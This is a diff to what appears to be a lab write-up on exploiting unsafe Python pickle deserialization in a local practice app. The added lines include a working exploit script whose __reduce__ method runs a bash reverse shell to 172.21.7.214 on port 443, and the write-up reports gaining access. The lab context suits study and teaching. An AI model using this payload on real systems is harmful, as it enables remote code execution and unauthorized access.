@@ -18,7 +18,7 @@ Open the browser localhost:5000
 
 The data that we put in the form is keeping in a variable named **att**
 
-The problem is that there isn't any type of sanitization, you can see the code in **/python/DES-Pickle/DES-Pickle.py**
+The problem is that **there isn't any type of sanitization**, you can see the code in **/python/DES-Pickle/DES-Pickle.py**
 
 ![](../../Images/Pasted%20image%2020230906203747.png)
 
@@ -91,6 +91,28 @@ But what happen?
 This code has been executed but don't show the output (normally is the status code)
 
 To verify if the command is well executing we can listen in port 443 (with [Netcat](../../Tools/Netcat.md))
+
+And put a [Reverse shells](../../Shells/Reverse%20shell/Reverse%20shells.md) in our exploit:
+
+````python
+#!/usr/bin/python3
+
+import pickle
+import os
+import binascii
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('bash -c "bash -i >& /dev/tcp/172.21.7.214/443 0>&1"',))
+
+if __name__ == '__main__':
+    print(binascii.hexlify(pickle.dumps(Exploit())))
+
+````
+
+We gain access!!
+
+![](../../Images/Pasted%20image%2020230906210558.png)
 
 
 
